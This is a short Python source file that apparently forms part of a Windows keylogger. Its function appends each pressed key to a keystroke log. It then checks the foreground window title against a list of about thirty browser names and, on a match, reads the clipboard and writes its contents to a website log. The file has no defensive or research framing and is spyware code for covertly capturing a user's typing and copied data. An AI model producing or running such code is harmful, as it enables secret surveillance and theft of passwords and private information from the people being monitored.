import win32gui  # Import the module for interacting with the Windows GUI
import win32clipboard  # Import the module for accessing the clipboard

def log_keystrokes(file_path, key):
    # Write the pressed key to the keystroke log file
    with open(f"{file_path}/f_keystroke.txt", "a") as f:
        f.write(f"{key}\n")

    # Get the title of the active window
    window = win32gui.GetWindowText(win32gui.GetForegroundWindow()).lower()

    # Define a set of browser names
    browsers = {
        "chrome", "firefox", "safari", "edge", "opera", "internet explorer", "brave", "chromium", "vivaldi",
        "yandex browser", "maxthon", "tor browser", "uc browser", "pale moon", "seamonkey", "avant browser",
        "midori", "epic browser", "comodo dragon", "waterfox", "slimjet", "basilisk", "falkon", "konqueror",
        "blisk", "torch browser", "puffin browser", "sleipnir", "otter browser", "lunascape"
    }

    # Check if the active window belongs to a browser
    for browser in browsers:
        if browser in window:
            try:
                # Access the clipboard to retrieve the URL
                win32clipboard.OpenClipboard()
                url = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                win32clipboard.CloseClipboard()
                if url:
                    url = url.decode("utf-8")
                    # Write the URL to the website log file
                    with open(f"{file_path}/f_website.log", "a") as f:
                        f.write(f"{url}\n")
            except Exception as e:
                print(f"Error accessing clipboard: {e}")
            break
